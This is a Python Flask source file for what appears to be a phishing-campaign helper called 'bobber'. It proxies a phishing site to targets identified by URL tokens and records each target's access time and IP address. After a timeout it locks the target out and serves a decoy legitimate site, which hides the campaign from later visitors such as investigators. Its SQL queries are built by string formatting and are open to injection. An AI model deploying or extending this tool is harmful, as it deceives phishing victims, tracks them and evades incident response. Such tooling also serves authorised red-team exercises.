#!/usr/bin/env python3

import sys
from datetime import datetime
import time

from flask import Flask
from flask import request,Response
import requests
import urllib
from urllib.parse import urljoin

import sqlalchemy
from sqlalchemy import *
from sqlalchemy.ext.declarative import declarative_base

from bs4 import BeautifulSoup, SoupStrainer

import threading

import base64

app = Flask(__name__)

tokens = []
token = 1
TIMESTAMP = datetime.now().strftime("%d.%m.%y-%H-%M-%S")


############################
# CHANGE THESE VARIABLES
############################

# Path to file containing target user tokens/IDs (one per line)
TOKENS = "/path/to/tokens/file"

############################

# This should be the URL for this server - make sure they line up with
# any settings defined in the app.run() function at the bottom of this
# file
REDIRECT_DOMAIN = "https://my.flask.app:8443"

############################

# This should be the URL where your phishing app is hosted
PHISHAPP_DOMAIN = "https://my.app.url"

############################

# This site will be used when an invalid request is made,
# or if the user is locked out by accessing the server.
#
# This should be a valid URL to a site with legitimate content.
SPOOFED_DOMAIN = "https://some.other.content.com"

############################

# This should be what the app uses to identify a user token on landing
# eg if the url is https://myapp.com?userguid=1234 then use "userguid"
TOKEN_DELIMITER = "CHANGEME"

############################

# This is the value of time (in seconds) the user should be able to
# access the phishing app before getting redirected
TIMEOUT_LENGTH = 900

############################

# Update this file if you want to reuse a generated bobber DB
# otherwise, a new one will be generated at restart
#
# To stop using auto-generated files, do the below
#
# Comment the top line to stop automatically generating a DB
# Fill out the BOBBER_LOCATION variable and uncomment the last 2 lines

BOBBER_DB = ("sqlite:///bobber.%s.db" % (TIMESTAMP))
#BOBBER_LOCATION = "/path/to/file/bobber.db"
#BOBBER_DB = ("sqlite:///%s" % (BOBBER_LOCATION))

############################
# END CHANGES AFTER HERE
############################

# List of users who have accessed the app
# but shouldn't be locked out yet
INTERMEDIATE_ACCESS_LIST = []

engine = create_engine(BOBBER_DB,echo=False)

def dbinit():
	#Gather tokens
	f_token = open(TOKENS,"r")
	line = f_token.readline()
	while line:
		tokens.append(line.rstrip())
		line = f_token.readline()
	f_token.close()

	#Create db file
	Base = declarative_base()
	class Tokens(Base):
		__tablename__ = 'tracker'
		id = Column(Integer, primary_key=True)
		userToken = Column(String)
		hasAccessed = Column(Integer)
		timeAccessed = Column(String)
		sourceIP = Column(String)

		def __init__(self, userToken, hasAccessed, timeAccessed):
			self.userToken = userToken
			self.hasAccessed = hasAccessed
			self.timeAccessed = timeAccessed
			self.sourceIP = sourceIP

	Base.metadata.create_all(engine)

	#Populate the database with user tokens
	c = engine.connect()
	t = c.begin()
	for token in range(0,len(tokens)):
		ins = 'INSERT INTO "tracker" (userToken,hasAccessed,timeAccessed,sourceIP) VALUES ("%s",0,"Not Accessed","0.0.0.0")' % (tokens[token])
		c.execute(ins)
	t.commit()
	c.close()

def remove_access(userID):
	if(userID in INTERMEDIATE_ACCESS_LIST):
		sys.exit(0)
	INTERMEDIATE_ACCESS_LIST.append(userID)
	time.sleep(TIMEOUT_LENGTH)
	INTERMEDIATE_ACCESS_LIST.remove(userID)
	c = engine.connect()
	t = c.begin()
	lockout = c.execute('UPDATE tracker set hasAccessed=1 WHERE userToken="%s"' % (userID))
	t.commit()
	c.close()

def accessed(userID, sourceIP):
	if(userID == False):
		return 0
	if userID in tokens:
		c = engine.connect()
		t = c.begin()
		result = c.execute('SELECT "hasAccessed" FROM tracker WHERE "userToken" = "%s"' % (userID))
		result = result.fetchone()
		accessTimestamp = c.execute('UPDATE tracker SET timeAccessed="%s" where userToken="%s"' % (datetime.now().strftime("%d.%m.%y-%H-%M-%S"), userID))
		source = c.execute('UPDATE tracker SET sourceIP="%s" where userToken="%s"' % (sourceIP, userID))
		t.commit()
		c.close()
		if(result["hasAccessed"] == 0):
			block = threading.Thread(target=remove_access, args=(userID,))
			block.start()
		return result["hasAccessed"]
	return 1

def process_content(request,  DOMAIN, **kwargs):
	#Assign default values if not specified
	try:
		gargs = kwargs["gargs"]
	except:
		gargs = ""
	try:
		pargs = kwargs["pargs"]
	except:
		pargs = {}
	try:
		path = kwargs["path"]
	except:
		path = ""

	if(request.method=="GET"):
		#Go fetch the content of the specified domain
		resp = requests.get(("%s/%s%s" % (DOMAIN,path,gargs)))
		excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
		headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
		response = Response(resp.content, resp.status_code, headers)

	elif(request.method=="POST"):
		resp = requests.post(("%s/%s%s" % (DOMAIN,path,gargs)), data=pargs)
		excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
		headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
		response = Response(resp.content, resp.status_code, headers)

	#Replace all links to route through the flask app
	soup = BeautifulSoup(response.data, "html.parser")
	for url in soup.find_all('a'):
		try:
			if(url.get('href')[0] == "/"):
				url["href"] = urljoin(REDIRECT_DOMAIN,url.get('href'))
		except:
			pass
	for img in soup.find_all('img'):
		try:
			if(img.get('src')[0] == "/"):
				imgex = str(img.get("src")[-3:])
				ib64 = base64.b64encode(urllib.request.urlopen(urljoin(DOMAIN,img.get('src'))).read())
				img["src"] = ("data:img/%s; base64,%s" % (imgex,ib64.decode("utf-8")))
		except:
			pass
	for l in soup.find_all('link'):
		try:
			if(l.get('href')[0] == "/"):
				l["href"] = urljoin(REDIRECT_DOMAIN,l.get('href'))
		except:
			pass
	for s in soup.find_all('script'):
		try:
			if(s.get('src')[0] == "/"):
				s["src"] = urljoin(REDIRECT_DOMAIN,s.get("src"))
				continue
			s = str(s).replace('src=\"/',('src=\"%s/\"' % (REDIRECT_DOMAIN)))
		except Exception as e:
			pass
	for f in soup.find_all('form'):
		try:
			if(f.get('action')[0] == "/"):
				f["action"] = urljoin(REDIRECT_DOMAIN,"%s%s" % (f.get("action"),gargs))
		except:
			pass

	response.data = soup.prettify()
	return response


#If the base url is requested
@app.route('/')
def index():
	#Default fail
	token = False
	PHISHAPP_DELIM = False
	#Grab the user ID from the end of the URL if it's there
	try:
		token = request.args[TOKEN_DELIMITER]
	#If it's not there, move on
	except Exception as e:
		pass

	if(TOKEN_DELIMITER in request.args):
		PHISHAPP_DELIM = True

	#If this is their first time accessing the site
	if((not accessed(token,request.environ.get('HTTP_X_REAL_IP', request.remote_addr))) and PHISHAPP_DELIM):
		gargs=""
		if request.method=='GET':
			#Gather GET arguments
			if(len(request.args) >= 1):
				gargs = "?"
				for key in request.args:
					gargs += ("&%s=%s" % (key, request.args[key]))
			#If not passing GET parameters
			return process_content(request,PHISHAPP_DOMAIN,gargs=gargs)

		#If requested via POST
		elif request.method=='POST':
			#Gather the POST arguments
			pargs = {}
			if(len(request.args) >= 1):
				gargs = "?"
				for key in request.args:
					gargs += ("&%s=%s" % (key, request.args[key]))
			else:
				gargs=("?%s=%s" % (TOKEN_DELIMITER, token))

			for i in request.values:
				pargs.update({ i : request.values[i]})

			return process_content(request, PHISHAPP_DOMAIN,pargs=pargs,gargs=gargs)

	else:
		gargs=""
		if request.method=='GET':
			#Gather GET arguments
			if(len(request.args) >= 1):
				gargs = "?"
				for key in request.args:
					gargs += ("&%s=%s" % (key, request.args[key]))
			return process_content(request,SPOOFED_DOMAIN,gargs=gargs)

		elif request.method=='POST':

			#Gather the POST arguments
			pargs = {}
			if(len(request.args) >= 1):
				gargs = "?"
				for key in request.args:
					gargs += ("&%s=%s" % (key, request.args[key]))
			else:
				gargs=("?%s=%s" % (TOKEN_DELIMITER, token))

			for i in request.values:
				pargs.update({ i : request.values[i]})

			return process_content(request, SPOOFED_DOMAIN,pargs=pargs,gargs=gargs)

#If specific urls are requested
@app.route('/<path:path>',methods=['GET','POST'])
def proxy(path):
	#Default fail
	token = False
	PHISHAPP_DELIM = False
	#Grab the user ID from the end of the URL if it's there
	try:
		token = request.args[TOKEN_DELIMITER]
	#If it's not there, move on
	except Exception as e:
		pass

	if(TOKEN_DELIMITER in request.args):
		PHISHAPP_DELIM = True

	#If there's no get args, it's likely not for the phishing app anymore
	if(len(request.args) == 0) and (request.method == "GET"):
		return process_content(request,SPOOFED_DOMAIN,path=path)

	#If this is their first time visiting
	if((not accessed(token,request.environ.get('HTTP_X_REAL_IP', request.remote_addr))) and PHISHAPP_DELIM):
		#If requested via GET
		gargs=""
		if request.method=='GET':
			#Gather GET arguments
			if(len(request.args) >= 1):
				gargs = "?"
				for key in request.args:
					gargs += ("&%s=%s" % (key, request.args[key]))
			return process_content(request, PHISHAPP_DOMAIN, path=path, gargs=gargs)

		#If requested via POST
		elif request.method=='POST':

			#Gather the POST arguments
			pargs = {}
			if(len(request.args) >= 1):
				gargs = "?"
				for key in request.args:
					gargs += ("&%s=%s" % (key, request.args[key]))
			else:
				gargs=("?%s=%s" % (TOKEN_DELIMITER, token))
			for i in request.values:
				pargs.update({ i : request.values[i]})
			return process_content(request, PHISHAPP_DOMAIN, path=path,pargs=pargs,gargs=gargs)
	else:
		#If this is not their first time visiting, or if the token is invalid
		gargs = ""
		#If requested via GET
		if request.method=='GET':
			if(len(request.args) >= 1):
				gargs="?"
				for key in request.args:
					gargs += ("&%s=%s" % (key, request.args[key]))

			#Go fetch the content of the spoofed domain
			return process_content(request, SPOOFED_DOMAIN, path=path, gargs=gargs)

		elif request.method=='POST':
			args = {}
			for i in request.values:
				args.update({ i : request.values[i]})
			#Go fetch the content of the spoofed domain
			return process_content(request, SPOOFED_DOMAIN, path=path, gargs=gargs, pargs=args)

if __name__ == '__main__':
	dbinit()
	app.run(host="0.0.0.0")
